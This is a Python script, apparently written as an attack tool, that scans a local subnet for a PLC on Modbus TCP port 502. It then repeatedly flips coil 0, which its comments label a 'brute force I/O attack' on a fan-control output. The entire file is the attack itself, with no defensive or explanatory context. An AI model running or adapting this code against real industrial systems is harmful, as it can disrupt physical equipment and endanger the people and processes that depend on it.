import time
import netifaces as ni
from pyModbusTCP.client import ModbusClient

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the engineering workstation
    interfaces = ni.interfaces()
    for interface in interfaces:
        addrs = ni.ifaddresses(interface)
        if ni.AF_INET in addrs:
            for link in addrs[ni.AF_INET]:
                ip = link['addr']
                if ip.startswith('192.168.9'):
                    # Scan the subnet for the PLC
                    for i in range(1, 255):
                        test_ip = f"192.168.9.{i}"
                        client = ModbusClient(host=test_ip, port=502, auto_open=True, auto_close=True)
                        if client.is_open():
                            print(f"PLC found at IP: {test_ip}")
                            return test_ip
    return None

# Function to perform brute force I/O attack
def brute_force_io(plc_ip):
    client = ModbusClient(host=plc_ip, port=502, auto_open=True, auto_close=True)
    if not client.is_open():
        print("Failed to connect to the PLC.")
        return

    print("Starting brute force I/O attack on %Q0.0 (Fan Control)...")
    while True:
        # Toggle the fan control output
        for value in [True, False]:
            client.write_single_coil(0, value)  # %Q0.0 is the first coil (address 0)
            time.sleep(0.1)  # Short delay to avoid overwhelming the PLC

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        brute_force_io(plc_ip)
    else:
        print("PLC not found on the network.")

if __name__ == "__main__":
    main()